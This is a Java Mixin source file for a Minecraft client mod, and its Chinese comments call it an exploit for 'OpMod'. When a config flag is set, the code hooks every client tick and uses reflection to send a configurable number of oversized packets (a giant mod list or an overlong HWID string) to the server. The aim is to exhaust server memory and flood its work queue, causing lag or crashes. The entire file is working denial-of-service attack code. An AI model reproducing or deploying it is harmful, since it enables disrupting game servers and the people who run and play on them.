package fku.org.example.fku.mixin; /* water */

import fku.org.example.fku.config.OpmodDosConfig;
import net.minecraft.client.Minecraft;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Set;
import java.util.TreeSet;

/**
 * OpMod DoS 利用（客户端高频发包循环）。
 *
 * 当 opmod_dos.json 中 loopEnabled 开启时，每个游戏 tick 通过反射向 opmod 的
 * PacketHandler.INSTANCE.sendToServer 发送 loopPerTick 个恶意包（mod 列表 / hwid），
 * 模拟“每秒数千个包”，配合另外两个攻击（巨型 mod 列表 / 超长 hwid）即可在服务端
 * 触发：解码期按自报 size 预分配大量内存 + 主线程 enqueueWork 队列无界堆积 → 卡服 / OOM。
 *
 * 反射发包是为了避免编译期依赖 opmod（它不在 fku 的编译 classpath 中）。
 * 默认关闭，手动改 opmod_dos.json 才生效。仅客户端生效（Dist.CLIENT）。
 */
@Mixin(Minecraft.class)
public abstract class MixinOpmodDosLoop {

    private static Object sendChannelCache = null;
    private static boolean channelResolved = false;

    @Inject(method = "runTick", at = @At("RETURN"))
    private void onRunTick(boolean renderLevel, CallbackInfo ci) {
        try {
            OpmodDosConfig cfg = OpmodDosConfig.getInstance();
            if (cfg == null || !cfg.loopEnabled) return;
            if (cfg.loopPerTick <= 0) return;

            Object channel = resolveChannel();
            if (channel == null) return;

            int perTick = cfg.loopPerTick;
            for (int i = 0; i < perTick; i++) {
                Object packet = buildMaliciousPacket(cfg);
                if (packet != null) {
                    sendPacket(channel, packet);
                }
            }
        } catch (Throwable ignored) {
            // 反射失败不应影响游戏循环
        }
    }

    private static Object resolveChannel() {
        if (channelResolved) return sendChannelCache;
        channelResolved = true;
        try {
            Class<?> handlerClass = Class.forName("lbxrman.mymod.opmod.network.PacketHandler");
            Field instField = handlerClass.getField("INSTANCE");
            sendChannelCache = instField.get(null);
        } catch (Throwable t) {
            sendChannelCache = null;
        }
        return sendChannelCache;
    }

    private static Object buildMaliciousPacket(OpmodDosConfig cfg) {
        try {
            if (cfg.modListAttack) {
                Class<?> cls = Class.forName("lbxrman.mymod.opmod.network.PacketSendModList");
                Constructor<?> ctor = cls.getConstructor(Set.class);
                int size = Math.max(1, cfg.modListSize);
                int strLen = Math.max(1, cfg.modListStringLen);
                StringBuilder sb = new StringBuilder(strLen);
                for (int i = 0; i < strLen; i++) sb.append((char) ('a' + (i % 26)));
                String base = sb.toString();
                Set<String> attack = new TreeSet<>();
                for (int i = 0; i < size; i++) attack.add(base + "_" + i);
                return ctor.newInstance(attack);
            } else if (cfg.hwidAttack) {
                Class<?> cls = Class.forName("lbxrman.mymod.opmod.network.PacketSendHwid");
                Constructor<?> ctor = cls.getConstructor(String.class);
                int len = Math.max(1, Math.min(cfg.hwidLen, 32767));
                StringBuilder sb = new StringBuilder(len);
                for (int i = 0; i < len; i++) sb.append((char) ('A' + (i % 26)));
                return ctor.newInstance(sb.toString());
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private static void sendPacket(Object channel, Object packet) {
        try {
            Method m = channel.getClass().getMethod("sendToServer", Object.class);
            m.invoke(channel, packet);
        } catch (Throwable ignored) {
        }
    }
}
